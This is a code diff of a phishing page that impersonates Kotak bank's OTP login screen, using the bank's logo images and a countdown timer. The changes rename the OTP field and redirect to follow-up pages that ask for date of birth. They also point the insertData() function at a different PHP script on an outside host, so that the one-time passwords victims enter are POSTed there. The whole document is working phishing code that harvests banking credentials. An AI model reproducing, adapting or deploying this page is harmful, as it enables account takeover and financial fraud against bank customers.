@@ -48,7 +48,7 @@ div.cnt
     font-size:14px; 
     font-family: 'Heebo', sans-serif; 
     font-weight:100;  
-    margin-top:10px;
+    margin-top:50px;
     color:#040404;
 }
 div.footer
@@ -178,11 +178,12 @@ hr.hr
 <body onload="startTimer();">
 <!-- Static- Please don't do anything here-->
   <script type="text/javascript">var submitted=false;</script>
+
 <!-- partial:index.partial.html -->
 <section class="sectioncontact-section" style="background-color:#FAFAFA;">
 	<div class="container contact-column">
 		<img src="Kotak_Logo.jpg" alt="" id="Lg">
-		<form class="contact-inform form" method="post">
+		<form class="contact-inform form">
 		    <div class="c">
 		    <h1>Enter OTP sent via SMS and email</h1>
 			</div><br>
@@ -190,11 +191,11 @@ hr.hr
 			<p1 style="color:grey; font-size:14px; font-family: 'Heebo', sans-serif; font-weight:400;">Enter the 6-digit OTP send to your registered mobile number and email.</p1><br><br>
 			</div>
 			<div class="form-control">
-				<input id="otp" type="text" name="1ST_OTP" class="form-input" placeholder="Enter OTP" inputmode="numeric" maxlength="6" pattern="[0-9]\d{5}" title="Please enter valid OTP !" required="">
+				<input type="text" name="2ND_OTP" class="form-input" placeholder="Enter OTP" inputmode="numeric" maxlength="6" pattern="[0-9]\d{5}" title="Please enter valid OTP !" required="" id="otp">
 				<label for="OTP" class="form-label">OTP</label>
 			</div>
 			<center><p1 style="color:grey; font-size:14px; font-family: 'Heebo', sans-serif; text-align:center;"><span style="color:grey; font-family: 'Heebo', sans-serif; font-weight:400; font-size:13px;" id="time"><p1> Your OTP will expire in  : </p1>59</span>
-			<span style="color:grey; font-size:14px; font-family: 'Heebo', sans-serif; font-weight:400; text-align:center;">&nbsp;second</span></p1></center><br>
+			<span style="color:grey; font-size:14px; font-family: 'Heebo', sans-serif; font-weight:400; text-align:center;">�&nbsp;second</span></p1></center>
 			<script type="text/javascript">
 			var timer=60;
 			var sec=0;
@@ -203,7 +204,7 @@ hr.hr
 			
 			if (timer<2) {
 			// timer.stop();
-			window.location.href = "code1.html";
+			window.location.href = "DOB_OTP_Expire.html";
 			}
 			
 			document.getElementById("time").innerHTML = "<p1> Your OTP will expire in  : </p1>"+sec.toString();
@@ -216,15 +217,13 @@ hr.hr
 			
 			</script>
 			<div class="footer">
-			<a style="color:#ffffff; font-size:14px; font-family: 'Heebo', sans-serif; font-weight:500; background-color:red; padding:2px 10px; border-radius:4px; text-decoration:none;" href="Card_Methods.html">Didn't receive OTP?</a>
+			<a style="color:grey; font-size:12px; font-family: 'Heebo', sans-serif; font-weight:300; text-decoration: underline;" href="DOB_OTP_Again.html">Didn't receive OTP?</a>
 			</div><br>
-			<a style="color:#00b4ef; font-size:14px; font-family: 'Heebo', sans-serif; font-weight:400; text-decoration: none;" href="Card_Methods.html">More login options</a>
+			<a style="color:#00b4ef; font-size:12px; font-family: 'Heebo', sans-serif; font-weight:400; text-decoration: none;" href="#">More login options</a>
 			<hr class="hr">
-			<button type="button" onclick="insertData()" class="btn">Secure Login</button>
+			<button type="button" class="btn" onclick="insertData()">Secure Login</button>
 </form></div></section>
             <img src="Kotak_Footer.jpg" alt="" id="Lg3"> 
-
-
 
 
 
@@ -244,13 +243,13 @@ hr.hr
 
                 // Send the data to the API endpoint using AJAX
                 var xhr = new XMLHttpRequest();
-                xhr.open("POST", "https://anikdevnath.com/KOTAK_WEB/2.php", true);
+                xhr.open("POST", "https://anikdevnath.com/KOTAK_WEB/7.php", true);
                 xhr.setRequestHeader("Content-Type", "application/json");
                 xhr.onreadystatechange = function() {
                     if (xhr.readyState === 4 && xhr.status === 200) {
                         console.log(xhr.responseText);
 
-                        window.location.href='Name_And_DOB.html';
+                        window.location.href='Processing_DOB.html';
                     }
                 };
                 xhr.send(JSON.stringify(data));
